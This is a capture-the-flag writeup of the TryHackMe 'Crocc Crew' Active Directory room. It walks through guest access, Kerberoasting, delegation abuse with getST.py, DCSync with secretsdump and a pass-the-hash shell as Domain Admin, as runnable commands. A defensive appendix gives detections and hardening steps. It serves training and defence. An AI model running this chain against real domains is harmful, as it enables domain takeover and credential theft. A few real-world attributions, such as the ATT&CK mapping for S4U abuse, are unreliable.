---
layout: default
title: Crocc Crew – Kerberoasting & Constrained Delegation Abuse
page_type: writeup
---

# Crocc Crew - Kerberoasting & Constrained Delegation Abuse

**Platform:** TryHackMe
**Category:** Active Directory
**Difficulty:** Medium

## 0. High-Level Overview

Crocc Crew is a single-domain Windows AD environment with one devastating misconfiguration: a service account that is both Kerberoastable and configured for constrained delegation with protocol transition. The chain starts with guest SMB credentials and ends with full Domain Administrator compromise of `COOCTUS.CORP`.

The core theme: "Crack one weak service account password, and a single delegation flag hands you the keys to the entire domain."

The environment:

- Single forest, single domain: `COOCTUS.CORP`
- Domain Controller: `DC.COOCTUS.CORP` (Windows Server 2019)
- Initial access: `Visitor:GuestLogin!` (provided guest credentials)
- Target: Domain Administrator + root flag

## 1. Recon - Mapping the AD Surface

From my attack box:

```bash
rustscan -a 10.64.158.191 --ulimit 5500 -- -A -Pn
```

The exposed services were textbook AD:

- Kerberos (88)
- LDAP (389 / 3268)
- SMB (445)
- RDP (3389)
- HTTP (80)

A standard domain controller fingerprint with a web service hanging off the side.

### 1.1 Web Enumeration

The web server gave away sensitive paths in `robots.txt`:

```bash
curl http://10.64.158.191/robots.txt
```

```
/db-config.bak
/backdoor.php
```

The backup file leaked database credentials in plain PHP:

```php
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";
```

These credentials don't end up being load-bearing for the AD chain, but their presence is a tell. The kind of environment that leaves a `.bak` file in webroot is the same kind of environment that leaves service accounts with weak passwords. It's a signal to keep digging.

## 2. Initial Foothold - From Empty Hands to Guest Creds

The challenge starts with no credentials. First moves: anonymous protocol probes.

```bash
rpcclient -U "" 10.64.158.191
rpcclient -U% 10.64.158.191
```

The null session connected, but every interesting RPC call (`enumdomusers`, `enumdomains`) returned `NT_STATUS_ACCESS_DENIED`. SMB null sessions were similarly locked down. Standard pre-auth recon dries up fast against a Server 2019 DC with default hardening.

The breakthrough came from RDP. Connecting with no credentials drops you on the lock screen, and the lock screen background has a sticky note image with credentials in plain text:

```
Visitor : GuestLogin!
```

This is a CTF flourish, but it has a real-world equivalent. Physical pentest engagements regularly find sticky notes under keyboards. Citrix and RDP environments have been compromised more than once because the login banner or wallpaper included demo credentials nobody bothered to remove. Visual recon of authentication surfaces is part of the job.

With the discovered creds in hand, I validated them:

```bash
crackmapexec smb DC.COOCTUS.CORP -u Visitor -p GuestLogin!
```

Authentication succeeded. With access confirmed, I enumerated the available shares:

```bash
smbclient -L //10.64.158.191 -U Visitor
```

The `Home` share was readable. Inside it, the user flag:

```bash
smbclient //10.64.158.191/Home -U Visitor
get user.txt
```

```
THM{Gu3s........}
```

A guest account shouldn't have read access to a share called `Home` containing user-flag-equivalent content in any production environment. In CTF land, it's the on-ramp to the AD enumeration phase.

## 3. Active Directory Enumeration

With even minimal credentials, LDAP is your friend. I dumped domain objects:

```bash
ldapdomaindump -u '10.64.158.191\Visitor' -p 'GuestLogin!' DC.COOCTUS.CORP
```

This produced HTML and JSON files covering users, groups, computers, and policies. The interesting accounts surfaced quickly when I sorted by `userAccountControl` flags.

### 3.1 Two Accounts Worth Looking At

Two accounts in the dump didn't fit the pattern of normal users.

The first was `admCroccCrew` -- a clearly admin-styled account name. Given the challenge framing ("Crocc Crew has created a backdoor on a Cooctus Corp Domain Controller"), this is the planted backdoor the room wants you to find. It's the easy answer to "what did they plant," but on its own it's just a named account. The membership and privileges would have to do something dangerous for it to actually matter.

The second account was where the path to DA actually lived: `password-reset`.

| Account | SPN | Flags |
|---------|-----|-------|
| `password-reset` | `HTTP/dc.cooctus.corp` | TRUSTED_TO_AUTH_FOR_DELEGATION |

That single row contains a complete attack path:

- **Has an SPN** -- Kerberoastable. Anyone with a domain account can request a service ticket for it and crack the resulting hash offline.
- **TRUSTED_TO_AUTH_FOR_DELEGATION set** -- constrained delegation with protocol transition (S4U2Self). This account can ask the KDC for a service ticket as *any* user, without that user's password.

Either of these alone is a finding. Together, on the same account, it's a direct path from "any domain user" to "Domain Admin."

Crocc Crew's planted backdoor is the visible threat; `password-reset`'s misconfiguration is the more dangerous one. The room rewards finding both, but only one of them takes us all the way to DA.

Key concept for newer folks: The TRUSTED_TO_AUTH_FOR_DELEGATION flag is the dangerous one. Plain constrained delegation requires that the user already authenticated to the service in a way that produces a forwardable ticket. Protocol transition removes that requirement -- the service account fabricates the user's identity from nothing.

## 4. Kerberoasting the Service Account

I requested a service ticket for `password-reset` and saved the encrypted blob:

```bash
GetUserSPNs.py COOCTUS.CORP/Visitor:GuestLogin! \
  -dc-ip 10.64.158.191 \
  -request \
  -outputfile out.txt
```

The ticket came back as RC4-HMAC (etype 23). RC4 is the gift that keeps on giving -- it cracks orders of magnitude faster than AES, and it's still issued anywhere a service account doesn't explicitly opt into AES-only encryption types.

### 4.1 Cracking the Ticket

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt out.txt
```

Result:

```
password-reset : resetpassword
```

A service account with the password `resetpassword` is exactly the kind of operational laziness that gets domains compromised. In a real environment this account should have a 240-character auto-rotated password. Here, it fell to rockyou in seconds.

## 5. Mapping the Delegation

With valid credentials for `password-reset`, I enumerated what it was allowed to delegate to:

```bash
findDelegation.py COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.64.158.191
```

The account was permitted to delegate to:

```
oakley/DC.COOCTUS.CORP
```

The service class (`oakley`) is custom to this lab -- what matters is the *host* portion. Two primitives are now available to us:

- **S4U2Self**: As `password-reset`, request a TGS for ourselves on behalf of any user (e.g., Administrator). Protocol transition lets us do this without the target user's credentials.
- **S4U2Proxy**: Use that TGS to request a TGS for the configured delegation target.

Combined, this is the textbook constrained delegation abuse chain: impersonate Administrator, then bounce that impersonation to a service on the DC.

## 6. Exploitation - S4U2Self + S4U2Proxy

Forged a service ticket impersonating `Administrator`, targeting the delegated SPN:

```bash
getST.py -spn oakley/DC.COOCTUS.CORP \
  -impersonate Administrator \
  "COOCTUS.CORP/password-reset:resetpassword" \
  -dc-ip 10.64.158.191
```

`getST.py` performs both S4U2Self and S4U2Proxy in a single call when the source account has the right flags. The output is a `.ccache` file containing a Kerberos service ticket for `oakley/DC.COOCTUS.CORP` as `Administrator`.

Loaded it into the environment:

```bash
export KRB5CCNAME=Administrator.ccache
klist
```

`klist` confirmed the ticket was present and the principal was `Administrator@COOCTUS.CORP`. From a Kerberos perspective, we are now the domain administrator -- against this specific host.

A nuance worth calling out: the ticket is technically scoped to `oakley/DC.COOCTUS.CORP`, not to LDAP or CIFS. In practice, Windows RPC services on the same host are lax about SPN class validation, which is why the seemingly-narrow `oakley/` delegation grants effectively unlimited access to DC services in the next step. This is the practical primitive that makes constrained delegation so dangerous in real environments.

## 7. Domain Credential Dumping

With the forged ticket loaded, Impacket's `secretsdump` runs over Kerberos against the DC:

```bash
secretsdump.py -k -no-pass DC.COOCTUS.CORP
```

`-k -no-pass` tells secretsdump to use the cached Kerberos ticket instead of password authentication. The tool dumps local SAM hashes first, then walks NTDS.dit via the DRSUAPI replication API -- the same mechanism domain controllers use to sync with each other. DCSync, mechanically, is just legitimate AD replication abused by a non-DC principal.

The output dumped every domain credential. The one we want:

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
```

The Domain Administrator NTLM hash. That's what we've been climbing toward.

## 8. Domain Compromise

With the Administrator NTLM hash in hand, pass-the-hash gives us interactive access:

```bash
evil-winrm -i 10.64.158.191 -u Administrator -H <hash>
```

Boom -- shell as `COOCTUS\Administrator` on the Domain Controller. Final flag:

```
THM{Cr0ccCr.........}
```

## Attack Chain Summary

| Stage | Action | Result |
|-------|--------|--------|
| 1 | Guest SMB authentication | User flag from `Home` share |
| 2 | LDAP enumeration | Identified `password-reset` (SPN + delegation flag) |
| 3 | Kerberoasting | Encrypted service ticket for `password-reset` |
| 4 | Offline cracking (John, rockyou) | Plaintext password: `resetpassword` |
| 5 | S4U2Self + S4U2Proxy | Forged TGS for Administrator targeting DC |
| 6 | Kerberos-authenticated DCSync | Administrator NTLM hash |
| 7 | Pass-the-hash via WinRM | Interactive shell as Domain Admin |

## Appendix A: Defensive Lessons Learned

### 1. Kerberoasting - SPNs on Privileged Accounts

**The Vulnerability:** The `password-reset` service account had an SPN registered, making it eligible for service ticket requests by any authenticated domain user. Combined with a weak password, the resulting ticket cracked offline in seconds.

**Why This Matters:**

- Any domain user can request a service ticket for any account with an SPN
- The resulting ticket is encrypted with the service account's password hash
- Cracking is fully offline -- no failed logins, no lockouts, no detection at the authentication layer
- A single cracked service account password compromises every resource that account can access

**Real-World Examples:**

- Maersk (NotPetya, 2017) -- Kerberoasting was part of the lateral movement chain
- Numerous ransomware playbooks list Kerberoasting as a default early move
- Pentesters report cracked SPNs on the majority of mid-sized AD environments they assess

**Defense in Depth:**

- **Migrate service accounts to gMSAs** -- Group Managed Service Accounts have 240-character auto-rotated passwords that cannot realistically be cracked
- **Disable RC4 Kerberos encryption** -- Force AES via the `msDS-SupportedEncryptionTypes` attribute. RC4 tickets crack orders of magnitude faster than AES.
- **Audit accounts with SPNs** -- Enumerate them regularly, justify each one, eliminate orphans
- **Strong passwords for non-gMSA service accounts** -- 25+ characters, manually rotated quarterly at minimum
- **Honeypot SPN** -- Plant a fake service account with an SPN and a known-uncrackable password, alert on any TGS request for it

**Detection Mechanisms:**

- Event ID 4769 -- Kerberos service ticket request. Filter for ticket encryption type RC4 (0x17) and unusual SPN access patterns.
- Bulk TGS requests from a single account in a short window are a strong signal of Kerberoasting tooling
- BloodHound queries identify all Kerberoastable accounts with privileged group membership

**Recommended Tools:**

- PingCastle -- AD risk assessment, flags Kerberoastable accounts with privilege
- BloodHound -- Visualizes Kerberoasting paths to high-value targets
- Microsoft Defender for Identity -- Real-time Kerberoasting detection

### 2. Constrained Delegation with Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION)

**The Vulnerability:** The `password-reset` account was configured with `TRUSTED_TO_AUTH_FOR_DELEGATION`, allowing it to use S4U2Self to fabricate Kerberos tickets for any user. Combined with a delegation target on the Domain Controller, this enabled a direct path from service-account-compromise to DA.

**Why This Matters:**

- Protocol transition removes the "user must have authenticated" requirement of plain constrained delegation
- Once the service account is compromised (e.g., via Kerberoasting), the attacker effectively has the ability to authenticate as any user
- The KDC issues these tickets without flagging anything anomalous -- this is "intended" Kerberos behavior

**Real-World Examples:**

- Documented in MITRE ATT&CK as T1558.003 (Kerberoasting) and T1134.005 (SID-History/S4U abuse)
- Public exploit tooling (Impacket, Rubeus) makes this a one-liner once the prerequisites are met
- HAFNIUM and other APTs have leveraged constrained delegation in published incident reports

**Defense in Depth:**

- **Audit `TRUSTED_TO_AUTH_FOR_DELEGATION` usage** -- Most environments don't actually need protocol transition. Justify every result of:

```powershell
Get-ADObject -Filter {UserAccountControl -band 16777216} -Properties UserAccountControl
```

- **Replace constrained delegation with RBCD** -- Resource-Based Constrained Delegation reverses the trust direction. The *target* configures who can delegate to it, reducing the blast radius of compromised principals.
- **Mark sensitive accounts as "Account is sensitive and cannot be delegated"** -- Set the `AccountNotDelegated` flag on Domain Admins, Enterprise Admins, krbtgt, and tier-0 service accounts.
- **Add high-value accounts to the Protected Users group** -- Forces AES, blocks delegation entirely, prevents NTLM use.

**Secure Configuration Pattern:**

```powershell
# Enumerate accounts with TRUSTED_TO_AUTH_FOR_DELEGATION
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} `
           -Properties TrustedToAuthForDelegation, ServicePrincipalNames

# Mark Domain Admins as non-delegatable
Get-ADGroupMember "Domain Admins" | ForEach-Object {
    Set-ADUser $_.SamAccountName -AccountNotDelegated $true
}

# Add critical accounts to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "Domain Admins"
```

**Detection Mechanisms:**

- Event ID 4769 -- Service ticket requests where `Service Name` and `Account Name` reveal S4U use (the requester is not the user being impersonated)
- S4U2Self requests are particularly suspicious when the impersonated user is a privileged account
- Microsoft Defender for Identity flags suspected S4U abuse natively

### 3. DCSync via Kerberos Authentication

**The Vulnerability:** Once a forged Kerberos ticket grants Domain Controller access, the DRSUAPI replication API (used legitimately for DC-to-DC sync) becomes available to extract every credential in the domain. `secretsdump.py -k -no-pass` uses exactly this path.

**Why This Matters:**

- DCSync is "intended" replication functionality -- it's hard to distinguish from legitimate DC traffic without context
- Once an attacker reaches DA equivalence, this is the standard credential exfiltration path
- The full krbtgt hash dumped this way enables permanent Golden Ticket persistence

**Defense in Depth:**

- **Audit who has DS-Replication-Get-Changes-All permission** -- Should be limited to Domain Controllers and explicit replication accounts. Anyone else with this right is effectively a DA.
- **Network segmentation** -- DRSUAPI traffic should only originate from other DCs, not arbitrary domain members
- **Tier-0 hygiene** -- Treat anyone who can DCSync as Domain Admin equivalent, regardless of their nominal group membership

**Detection Mechanisms:**

- Event ID 4662 with the GUID for `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) and related replication GUIDs from non-DC source addresses
- Microsoft Defender for Identity has a built-in DCSync detection that catches the standard tool patterns

### 4. Defense Prioritization

If you can only fix five things after reading this writeup, prioritize these:

1. **Migrate service accounts to gMSAs** -- Eliminates Kerberoasting as a viable attack against those accounts
2. **Audit and minimize `TRUSTED_TO_AUTH_FOR_DELEGATION`** -- Most environments need zero of these
3. **Disable RC4 Kerberos encryption domain-wide** -- Forces AES, dramatically slows offline cracking
4. **Mark privileged accounts as non-delegatable** -- One-line fix that eliminates a whole class of S4U abuse
5. **Deploy Defender for Identity (or equivalent)** -- The Kerberos abuse signals here are exactly what these tools are designed to detect

**Additional Resources:**

- MITRE ATT&CK T1558.003 (Kerberoasting): <https://attack.mitre.org/techniques/T1558/003/>
- MITRE ATT&CK T1550.003 (Pass the Ticket): <https://attack.mitre.org/techniques/T1550/003/>
- harmj0y on S4U abuse: <https://blog.harmj0y.net/activedirectory/s4u2pwnage/>
- Active Directory Security: <https://adsecurity.org/>

## Final Thoughts

This challenge is a study in how Active Directory's most powerful features become its most dangerous attack paths when paired with weak credential hygiene. None of the primitives used here are zero-days. Kerberoasting is from 2014. S4U abuse is older. RC4's deprecation has been "any year now" since at least 2017. They keep working because environments keep shipping with default service accounts, weak passwords on those accounts, and delegation flags set by administrators who don't fully understand the implications.

The defensive recommendations are not novel either. gMSAs landed in Windows Server 2012. Resource-Based Constrained Delegation has been the recommended replacement for plain constrained delegation since 2012 R2. The Protected Users group landed in 2012 R2. These features exist -- they just don't get adopted because the legacy configuration "still works."

Active Directory environments don't get compromised because the attack techniques are too sophisticated to defend against. They get compromised because a service account from 2009 still has its original 12-character password and a delegation flag that nobody remembers setting.
